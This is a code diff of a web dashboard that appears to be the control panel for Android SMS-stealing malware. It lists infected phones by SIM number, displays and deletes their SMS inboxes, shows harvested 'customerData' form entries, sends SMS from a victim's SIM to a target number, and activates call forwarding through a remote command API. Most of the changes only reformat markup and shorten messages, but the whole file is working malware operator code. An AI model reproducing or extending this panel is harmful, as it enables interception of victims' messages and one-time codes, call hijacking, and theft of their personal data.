@@ -100,24 +100,32 @@
         <div class="grid" id="grid"></div>
     </div>
 
-    <!-- Modals -->
     <div id="viewDataModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header"><h2 id="modalHeaderTitle">📋 Device Details</h2><button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button></div>
+            <div class="modal-header">
+                <h2 id="modalHeaderTitle">📋 Device Details</h2>
+                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
+            </div>
             <div id="modalBody"></div>
         </div>
     </div>
 
     <div id="viewSmsModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header"><h2>📬 SMS Inbox</h2><button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button></div>
+            <div class="modal-header">
+                <h2>📬 SMS Inbox</h2>
+                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
+            </div>
             <div id="smsModalBody"></div>
         </div>
     </div>
 
     <div id="actionModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header"><h2 id="actionModalTitle">Action</h2><button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button></div>
+            <div class="modal-header">
+                <h2 id="actionModalTitle">Action</h2>
+                <button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button>
+            </div>
             <div id="actionModalBody"></div>
             <div id="cmdStatusBox" class="cmd-status-box"></div>
         </div>
@@ -144,7 +152,7 @@
             tempInput.select();
             document.execCommand("copy");
             document.body.removeChild(tempInput);
-            toast("Copied to clipboard!");
+            toast("Copied!");
         }
 
         async function login() {
@@ -171,7 +179,6 @@
 
         socket.on('dashboard-update', () => fetchData(false));
 
-        // Real-time Command Result Listener
         socket.on('command-result', (data) => {
             const statusBox = document.getElementById('cmdStatusBox');
             if (statusBox) {
@@ -221,9 +228,7 @@
             list.forEach((d, idx) => {
                 const id = d._id || d.deviceId;
                 const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
-                const statusBadge = d.isOnline 
-                    ? `<span class="status-badge status-online">ONLINE</span>`
-                    : `<span class="status-badge status-offline">OFFLINE</span>`;
+                const statusBadge = d.isOnline ? '<span class="status-badge status-online">ONLINE</span>' : '<span class="status-badge status-offline">OFFLINE</span>';
                 
                 const card = document.createElement('div');
                 card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
@@ -233,15 +238,10 @@
                         <i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i>
                         <span style="font-weight:bold;">${d.battery||0}%</span>
                     </div>
-                    <div class="serial-badge">
-                        #${idx + 1}<br><small>${d.model || 'Unknown'}</small>
-                        <br>${statusBadge}
-                    </div>
-                    
+                    <div class="serial-badge">#${idx + 1}<br><small>${d.model || 'Unknown'}</small><br>${statusBadge}</div>
                     <div class="info" style="margin-top: 25px;"><b>SIM1:</b> <span>${d.sim1 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim1}')"></i></span></div>
                     <div class="info"><b>SIM2:</b> <span>${d.sim2 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim2}')"></i></span></div>
                     <div class="info"><b>Last Seen:</b> <span>${formatLastSeen(d.lastSeen)}</span></div>
-                    
                     <div class="btns">
                         <button class="btn-sm btn-view" onclick="viewData('${id}')">VIEW DATA</button>
                         <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${id}')">VIEW SMS</button>
@@ -264,7 +264,6 @@
                 const dev = d.device;
                 const statusHtml = dev.isOnline ? '<span style="color:var(--success);font-weight:bold;">ONLINE</span>' : '<span style="color:var(--danger);font-weight:bold;">OFFLINE</span>';
                 const installDate = dev.registrationTimestamp ? new Date(dev.registrationTimestamp).toLocaleString() : 'N/A';
-                
                 document.getElementById('modalBody').innerHTML = `
                     <div style="background:#f1f5f9; padding:10px; border-radius:12px;">
                         <table class="data-table">
@@ -296,15 +295,9 @@
                     const safeBody = m.body.replace(/'/g, "\\'").replace(/"/g, '&quot;');
                     return `
                     <div class="sms-item">
-                        <div class="from">
-                            <span>#${i+1} From: ${m.address || m.from}</span>
-                            <i class="fas fa-trash del-sms" onclick="deleteSms('${id}', '${safeBody}', '${m.date}')"></i>
-                        </div>
+                        <div class="from"><span>#${i+1} From: ${m.address || m.from}</span><i class="fas fa-trash del-sms" onclick="deleteSms('${id}', '${safeBody}', '${m.date}')"></i></div>
                         <div class="body">${m.body}</div>
-                        <div class="footer">
-                            <span>${formatLastSeen(m.date || m.time)}</span>
-                            <i class="fas fa-copy copy-icon" onclick="copyText('${safeBody}')" title="Copy SMS"></i>
-                        </div>
+                        <div class="footer"><span>${formatLastSeen(m.date || m.time)}</span><i class="fas fa-copy copy-icon" onclick="copyText('${safeBody}')"></i></div>
                     </div>`;
                 }).join('');
             } catch(e) { toast('Error', true); }
@@ -315,8 +308,8 @@
             try {
                 const r = await fetch('/api/delete-sms', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, smsData: { body, date } }) });
                 const d = await r.json();
-                if(d.success) { toast("SMS Deleted Successfully"); viewSms(deviceId); }
-            } catch(e) { toast("Failed to delete SMS", true); }
+                if(d.success) { toast("SMS Deleted"); viewSms(deviceId); }
+            } catch(e) { toast("Failed", true); }
         }
 
         async function viewFormData(id) {
@@ -329,16 +322,12 @@
                 const data = d.customerData || {};
                 const entries = Object.entries(data);
                 if(entries.length === 0) {
-                    document.getElementById('modalBody').innerHTML = '<div class="no-data">No form data submitted</div>';
+                    document.getElementById('modalBody').innerHTML = '<div class="no-data">No form data</div>';
                     return;
                 }
                 document.getElementById('modalBody').innerHTML = entries.map(([k, v], i) => {
                     const safeVal = String(v).replace(/'/g, "\\'").replace(/"/g, '&quot;');
-                    return `
-                    <div style="background:#fffde7; padding:15px; margin-bottom:12px; border-radius:10px; border-left:5px solid #fbc02d; display:flex; justify-content:space-between; align-items:center; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                        <div><b>${i+1}. ${k}:</b> ${v}</div>
-                        <i class="fas fa-copy copy-icon" style="color:#fbc02d; font-size: 20px;" onclick="copyText('${safeVal}')"></i>
-                    </div>`;
+                    return `<div style="background:#fffde7; padding:15px; margin-bottom:12px; border-radius:10px; border-left:5px solid #fbc02d; display:flex; justify-content:space-between; align-items:center;"><div><b>${i+1}. ${k}:</b> ${v}</div><i class="fas fa-copy copy-icon" style="color:#fbc02d; font-size: 20px;" onclick="copyText('${safeVal}')"></i></div>`;
                 }).join('');
             } catch(e) { toast('Error', true); }
         }
@@ -347,22 +336,10 @@
             document.getElementById('actionModalTitle').innerText = 'Send SMS';
             document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
-                <div class="input-group">
-                    <label>SELECT SIM SLOT:</label>
-                    <select id="smsSim">
-                        <option value="1">SIM 1</option>
-                        <option value="2">SIM 2</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>RECIPIENT NUMBER:</label>
-                    <input type="text" id="smsNum" placeholder="Target mobile number">
-                </div>
-                <div class="input-group">
-                    <label>MESSAGE TEXT:</label>
-                    <textarea id="smsMsg" rows="6" placeholder="Type your message here..."></textarea>
-                </div>
-                <button class="btn-gold" style="width:100%; padding:15px; margin-top: 10px;" onclick="sendSms('${id}')">SEND SMS</button>`;
+                <div class="input-group"><label>SELECT SIM SLOT:</label><select id="smsSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>
+                <div class="input-group"><label>RECIPIENT NUMBER:</label><input type="text" id="smsNum" placeholder="Target mobile number"></div>
+                <div class="input-group"><label>MESSAGE TEXT:</label><textarea id="smsMsg" rows="6" placeholder="Type message..."></textarea></div>
+                <button class="btn-gold" style="width:100%; padding:15px;" onclick="sendSms('${id}')">SEND SMS</button>`;
             document.getElementById('actionModal').classList.add('show');
         }
 
@@ -370,23 +347,13 @@
             const sim = document.getElementById('smsSim').value;
             const number = document.getElementById('smsNum').value;
             const message = document.getElementById('smsMsg').value;
-            if(!number || !message) return toast("Please fill all fields", true);
-            
+            if(!number || !message) return toast("Fill all fields", true);
             const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = "⏳ Waiting for device response...";
-
+            statusBox.style.display = 'block'; statusBox.style.background = '#e3f2fd'; statusBox.style.color = '#1976d2'; statusBox.innerText = "⏳ Waiting for response...";
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'SEND_SMS', data: { simSlot: sim, number, message } }) });
                 const d = await r.json();
-                if (!d.success) {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = "❌ " + (d.message || "Device Offline");
-                    toast(d.message || "Failed", true);
-                }
+                if (!d.success) { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
             } catch(e) { toast("Error", true); }
         }
 
@@ -394,21 +361,9 @@
             document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
             document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
-                <div class="input-group">
-                    <label>SELECT SIM SLOT:</label>
-                    <select id="cfSim">
-                        <option value="1">SIM 1</option>
-                        <option value="2">SIM 2</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>ENTER TARGET NUMBER:</label>
-                    <input type="text" id="cfNum" placeholder="Enter target number">
-                </div>
-                <div style="display:flex; gap:10px; margin-top:20px;">
-                    <button class="btn-sm btn-sms" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_ACTIVATE')">ACTIVATE</button>
-                    <button class="btn-sm btn-del" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_DEACTIVATE')">DEACTIVATE</button>
-                </div>
+                <div class="input-group"><label>SELECT SIM SLOT:</label><select id="cfSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>
+                <div class="input-group"><label>ENTER TARGET NUMBER:</label><input type="text" id="cfNum" placeholder="Target number"></div>
+                <div style="display:flex; gap:10px; margin-top:20px;"><button class="btn-sm btn-sms" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_ACTIVATE')">ACTIVATE</button><button class="btn-sm btn-del" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_DEACTIVATE')">DEACTIVATE</button></div>
                 <button class="btn-sm btn-view" style="width:100%; margin-top:10px; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_STATUS')">CHECK STATUS</button>`;
             document.getElementById('actionModal').classList.add('show');
         }
@@ -416,70 +371,39 @@
         async function cfAction(id, action) {
             const sim = document.getElementById('cfSim').value;
             const number = document.getElementById('cfNum').value;
-            if(action === 'CALL_FORWARD_ACTIVATE' && !number) return toast("Enter number", true);
-            
             const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = "⏳ Waiting for device response...";
-
+            statusBox.style.display = 'block'; statusBox.style.background = '#e3f2fd'; statusBox.style.color = '#1976d2'; statusBox.innerText = "⏳ Waiting for response...";
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action, data: { simSlot: sim, number } }) });
                 const d = await r.json();
-                if (!d.success) {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = "❌ " + (d.message || "Device Offline");
-                    toast(d.message || "Failed", true);
-                }
+                if (!d.success) { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
             } catch(e) { toast("Error", true); }
         }
 
         function delDevice(id) {
-            const pass = prompt("Enter ADMIN PASSWORD to confirm deletion:");
+            const pass = prompt("Enter ADMIN PASSWORD:");
             if(!pass) return;
-            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password: pass }) })
-                .then(r => r.json())
-                .then(d => {
-                    if(d.success) { toast("Device and all data erased!"); fetchData(false); }
-                    else toast(d.message || "Wrong Password", true);
-                });
+            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password: pass }) }).then(r => r.json()).then(d => {
+                if(d.success) { toast("Deleted!"); fetchData(false); } else toast(d.message || "Error", true);
+            });
         }
 
         function showChangePassModal() {
             document.getElementById('actionModalTitle').innerText = '🔐 Change Password';
             document.getElementById('cmdStatusBox').style.display = 'none';
-            document.getElementById('actionModalBody').innerHTML = `
-                <div class="input-group">
-                    <label>CURRENT PASSWORD:</label>
-                    <input type="password" id="oldP" placeholder="Enter old password">
-                </div>
-                <div class="input-group">
-                    <label>NEW PASSWORD:</label>
-                    <input type="password" id="newP" placeholder="Enter new password">
-                </div>
-                <button class="btn-gold" style="width:100%; padding:15px; margin-top:10px;" onclick="submitChangePass()">UPDATE PASSWORD</button>`;
+            document.getElementById('actionModalBody').innerHTML = `<div class="input-group"><label>OLD PASSWORD:</label><input type="password" id="oldP"></div><div class="input-group"><label>NEW PASSWORD:</label><input type="password" id="newP"></div><button class="btn-gold" style="width:100%; padding:15px;" onclick="submitChangePass()">UPDATE</button>`;
             document.getElementById('actionModal').classList.add('show');
         }
 
         async function submitChangePass() {
             const oldPassword = document.getElementById('oldP').value;
             const newPassword = document.getElementById('newP').value;
-            if(!oldPassword || !newPassword) return toast("Fill all fields", true);
-            try {
-                const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword, newPassword }) });
-                const d = await r.json();
-                if(d.success) { toast("Password Change Successful!"); closeModal('actionModal'); }
-                else toast(d.message || "Failed", true);
-            } catch(e) { toast("Server error", true); }
+            const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword, newPassword }) });
+            const d = await r.json();
+            if(d.success) { toast("Updated!"); closeModal('actionModal'); } else toast(d.message, true);
         }
 
-        async function togglePin(id, status) {
-            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) });
-            fetchData(false);
-        }
-
+        async function togglePin(id, status) { await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) }); fetchData(false); }
         function closeModal(id) { document.getElementById(id).classList.remove('show'); }
     </script>
 </body>
